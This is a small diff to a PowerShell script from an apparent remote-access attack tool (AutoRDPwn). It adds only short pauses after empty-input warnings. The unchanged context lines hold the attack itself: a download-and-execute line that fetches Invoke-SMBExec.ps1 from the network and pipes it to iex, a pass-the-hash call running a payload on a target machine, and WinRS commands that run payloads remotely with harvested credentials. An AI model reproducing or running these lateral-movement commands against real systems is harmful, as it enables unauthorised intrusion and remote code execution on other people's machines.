@@ -253,7 +253,7 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
         $domain = $Host.UI.ReadLine() ; if(!$domain) { $domain = 'localhost' ; Write-Host "localhost" }
         do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
-        $hash = $Host.UI.ReadLine() ; if(!$hash) { Write-Host $txt6 -ForegroundColor Red }} until ( $hash )
+        $hash = $Host.UI.ReadLine() ; if(!$hash) { Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $hash )
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1" ; Write-Host
@@ -308,10 +308,10 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
         $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
         do { Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $txt6 -ForegroundColor Red }} until ( $user )
+        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $user )
         do { Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { Write-Host $txt6 -ForegroundColor Red }} until ( $PlainTextPassword )
+	if(!$PlainTextPassword) { Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $PlainTextPassword )
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
